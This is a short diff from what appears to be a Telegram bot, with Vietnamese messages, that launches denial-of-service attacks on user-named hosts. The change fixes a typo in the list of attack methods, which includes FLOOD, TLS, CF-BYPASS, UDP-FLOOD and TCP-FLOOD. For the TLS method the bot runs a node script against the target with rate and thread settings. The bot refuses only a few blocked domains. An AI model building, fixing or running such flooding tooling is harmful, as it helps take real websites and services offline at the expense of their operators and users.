@@ -298,7 +298,7 @@ def attack_command(message):
                 bot.reply_to(message, f"‼️Không được phép tấn công trang web có tên miền {blocked_domain}‼️")
                 return
 
-    if method in ['FLOOD',' TLS', 'GOD', 'DESTROY', 'CF-BYPASS', 'UDP-FLOOD', 'TCP-FLOOD']:
+    if method in ['FLOOD', 'TLS', 'GOD', 'DESTROY', 'CF-BYPASS', 'UDP-FLOOD', 'TCP-FLOOD']:
         # Update the command and duration based on the selected method
         if method == 'TLS':
             command = ["node", "TLS.js", host, "90", "64", "5"]
